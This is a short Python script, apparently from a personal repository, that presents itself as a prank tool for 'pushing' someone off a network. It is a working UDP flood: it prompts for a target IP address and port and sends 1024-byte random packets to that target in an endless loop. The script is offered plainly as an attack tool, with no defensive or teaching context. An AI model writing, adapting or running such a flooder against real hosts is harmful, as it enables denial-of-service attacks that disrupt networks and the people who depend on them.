#coded by jobe62, wiev my repo at https://github.com/jobe62/J0b3_repo/
import sys, time
import socket, random
import os

sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes=random._urandom(1024)

def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.03)

def print_real_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(2.0)
 

def starting_page():
    print('                                      PUSH YOUR MOM OFF THE NETWORK')
    print_slow('''
    -->Type 'FuckOff' to flood with udp packets a target
    -->Type 'Quit' tp exit

--$> ''')

    choose=input()

    if choose=='FuckOff':
        
        ip=input('IP to attack: ')
        port=input('Port to attack: ')

        port1=int(port)
        

        while 1:
            sock.sendto(bytes, (ip, port1))
            print_slow('''I'm getting down the IP
Close program to stop
''')
            print_real_slow('-#'*50)
    elif choose =='Quit':
        quit()

    else:
        print('Something is wrong, try again')
        os.system('clear')
        starting_page()


starting_page()
